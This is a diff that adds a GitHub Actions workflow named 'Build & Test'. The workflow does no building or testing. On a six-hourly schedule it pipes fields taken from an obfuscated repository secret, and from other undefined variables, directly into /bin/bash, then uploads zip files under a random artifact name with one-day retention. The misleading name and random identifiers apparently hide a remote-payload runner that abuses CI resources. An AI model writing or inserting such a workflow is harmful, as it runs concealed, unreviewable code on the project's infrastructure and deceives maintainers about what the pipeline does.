@@ -1,0 +1,31 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '16 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          qy93828: ${{ secrets.qy93828 }}
+        run: |
+          printf '%s' "$qy93828" | jq -r .vj56 | /bin/bash
+          printf '%s' "$ewmt47" | jq -r .xvtyt20 | /bin/bash
+          printf '%s' "$yq478" | jq -r .urx608 | /bin/bash
+          echo $amtqw09 | jq -r .njf16162 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: xRyqvvhI
+          path: "*.zip"
+          retention-days: 1
